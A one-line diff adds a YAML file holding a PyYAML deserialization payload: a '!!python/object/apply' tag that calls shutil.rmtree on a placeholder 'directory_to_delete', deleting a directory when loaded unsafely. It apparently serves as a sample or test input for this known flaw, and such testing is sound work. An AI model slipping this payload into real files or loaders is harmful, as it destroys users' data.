@@ -1,0 +1,1 @@
+a: !!python/object/apply:__import__('shutil').rmtree ['directory_to_delete']
